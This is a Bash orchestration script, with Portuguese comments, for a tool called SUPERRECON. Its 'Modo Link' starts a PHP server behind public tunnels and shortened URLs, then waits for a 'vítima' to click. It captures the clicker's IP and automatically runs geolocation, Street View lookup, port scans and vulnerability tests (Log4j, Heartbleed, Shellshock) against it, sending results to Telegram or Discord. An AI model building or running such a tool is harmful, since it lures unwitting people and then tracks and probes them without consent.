#!/bin/bash
# super_recon.sh - Orquestrador principal do SUPERRECON v2.0
# 80% Shell, 20% PHP (apenas index.php)

# Carrega configurações
source config.env 2>/dev/null || {
    echo "Arquivo config.env não encontrado! Copie o modelo."
    exit 1
}

# Garante que jq está no PATH (Windows via winget)
if ! command -v jq &>/dev/null; then
    _jq_dir="$(cd "$(dirname "$APPDATA")/Local/Microsoft/WinGet/Packages/jqlang.jq_Microsoft.Winget.Source_8wekyb3d8bbwe" 2>/dev/null && pwd)"
    [ -n "$_jq_dir" ] && export PATH="$PATH:$_jq_dir"
fi

# Carrega os módulos lib/
source lib/core.sh
source lib/geo.sh
source lib/ports.sh
source lib/weather.sh
source lib/whois.sh
source lib/streetview.sh
source lib/report.sh
source lib/tunnels.sh
source lib/notify.sh
source lib/banners.sh
source lib/network.sh
source lib/dns.sh
source lib/whois_domain.sh
source lib/export.sh
source lib/cve.sh
source lib/dns_axfr.sh
source lib/security_headers.sh
source lib/email_security.sh
source lib/subdomains.sh
source lib/robots.sh
source lib/vuln_tests.sh
source lib/ssl_test.sh
source lib/shodan.sh
source lib/monitor.sh
source lib/social_osint.sh
source lib/earth_integration.sh
source lib/cep.sh
source lib/dorks.sh
source lib/pwned.sh
source lib/abuse.sh
source lib/cloud.sh
source lib/cms.sh

# ========== HELP ==========
mostrar_help() {
    cat <<EOF
SUPERRECON v2.0 - Engrenagem de Reconhecimento OSINT

Uso:
  ./super_recon.sh                          # Modo Link (sobe servidor + túneis)
  ./super_recon.sh -s <IP>                  # Modo Scan manual (analisa um IP)
  ./super_recon.sh --monitor <IP>           # Scan + monitoramento com diff
  ./super_recon.sh --cron <IP> [intervalo]  # Gera script para cron/agendador
  ./super_recon.sh --scan-advanced <IP>     # Scan completo + monitor + cron
  ./super_recon.sh -h                       # Mostra esta ajuda

Modo Link:
  - Gera links com 3 túneis simultâneos (Cloudflared, Ngrok, Loclx)
  - Encurta URLs automaticamente (TinyURL + is.gd)
  - Aguarda vítima clicar e dispara o scan completo

Modo Scan (Pacote 3):
  - Geolocalização, WHOIS, clima, Street View, mapa
  - Port scanning TCP/UDP + nmap avançado (-sV, -O, --script)
  - Banner grabbing (HTTP, SSH, FTP, SSL, favicon hash)
  - Reconhecimento de rede (/24, traceroute, reverse IP, reverse DNS)
  - Subdomínios brute-force (DNS), robots.txt/sitemap.xml
  - SSL/TLS profundo (TLS 1.0-1.3, POODLE, BEAST, CRIME, cifras fracas)
  - Testes de vulnerabilidade (Log4j, Heartbleed, Shellshock, SSH)
  - Security headers (HSTS, CSP, XFO, Permissions-Policy, COEP, COOP, CORP)
  - Email security (SPF/DKIM/DMARC + análise de spoofing)
  - Shodan/Censys (opcional, requer chave)
  - Relatório HTML + PDF + JSON + CSV
  - Notificações Telegram/Discord
  - Monitoramento com detecção de alterações

Dependências: php, curl, jq, whois, openssl, dig/host, cloudflared, ngrok, loclx
EOF
}

# ========== VERIFICA PHP ==========
check_php() {
    if command -v php &>/dev/null; then
        return 0
    fi

    if which php &>/dev/null 2>&1; then
        return 0
    fi

    if command -v cmd &>/dev/null; then
        local php_path=$(cmd /c "where php 2>nul" 2>/dev/null | head -n1)
        if [ -n "$php_path" ] && [ -f "$php_path" ]; then
            export PATH="$PATH:$(dirname "$php_path")"
            return 0
        fi
    fi

    local paths=(
        "/c/Program Files/php/php.exe"
        "/c/Program Files/PHP/php.exe"
        "/c/xampp/php/php.exe"
        "/c/php/php.exe"
        "/c/Program Files (x86)/php/php.exe"
        "/d/Program Files/php/php.exe"
    )
    for path in "${paths[@]}"; do
        if [ -f "$path" ]; then
            export PATH="$PATH:$(dirname "$path")"
            return 0
        fi
    done

    return 1
}

# ========== MODO SERVIDOR (LINK) ==========
modo_servidor() {
    log_info "Modo Link ativado."
    local port=${PHP_PORT:-8080}
    local redirect=${REDIRECT_URL:-"https://www.google.com"}

    # Limpa capturas anteriores para evitar re-scan
    rm -f captures/last_ip.txt

    if ! check_php; then
        log_error "PHP não encontrado."
        log_info "Instale o PHP:"
        echo -e "${YELLOW}  Linux/WSL: sudo apt install php${NC}"
        echo -e "${YELLOW}  Windows: choco install php${NC}"
        echo -e "${YELLOW}  Windows: winget install PHP${NC}"
        tui_msgbox "PHP não instalado.\n\nInstale e tente novamente." "Erro"
        return 1
    fi

    log_info "Iniciando PHP Server na porta $port..."
    REDIRECT_URL="$redirect" php -S 0.0.0.0:"$port" -t . &> php.log &
    local php_pid=$!
    sleep 2
    log_success "PHP Server rodando (PID $php_pid)"

    start_all_tunnels "$port"

    log_info "Aguardando vitimas... (Pressione Ctrl+C para sair)"
    local last_ip=""
    while true; do
        if [ -f "captures/last_ip.txt" ]; then
            local new_ip=$(cat captures/last_ip.txt)
            if [ "$new_ip" != "$last_ip" ] && [ -n "$new_ip" ]; then
                log_success "Nova captura: IP $new_ip"
                processar_ip "$new_ip" &
                last_ip="$new_ip"
            fi
        fi
        sleep 2
    done

    cleanup_tunnels
    _win_kill "$php_pid"
    log_info "Servidor encerrado."
}

trap 'cleanup_tunnels; kill $(jobs -p) 2>/dev/null; exit' INT

# ========== PARSER DE ARGUMENTOS ==========
# So executa se for chamado diretamente (nao quando source'd)
if [ "${BASH_SOURCE[0]}" = "${0}" ]; then
case "$1" in
    -s|--scan)
        if [ -z "$2" ]; then
            log_error "IP não fornecido. Use: $0 -s <IP>"
            exit 1
        fi
        processar_ip "$2"
        ;;
    --monitor)
        if [ -z "$2" ]; then
            log_error "IP não fornecido. Use: $0 --monitor <IP>"
            exit 1
        fi
        init_monitor
        processar_ip "$2"
        check_monitor "$2" "output/recon_$(echo "$2" | sed 's/:/_/g')"
        ;;
    --cron)
        if [ -z "$2" ]; then
            log_error "IP não fornecido. Use: $0 --cron <IP> [intervalo]"
            exit 1
        fi
        setup_cron "$2" "$3"
        ;;
    --scan-advanced)
        if [ -z "$2" ]; then
            log_error "IP não fornecido. Use: $0 --scan-advanced <IP>"
            exit 1
        fi
        init_monitor
        processar_ip "$2"
        init_monitor
        check_monitor "$2" "output/recon_$(echo "$2" | sed 's/:/_/g')"
        setup_cron "$2" "*/6"
        ;;
    -h|--help)
        mostrar_help
        ;;
    *)
        modo_servidor
        ;;
esac
fi
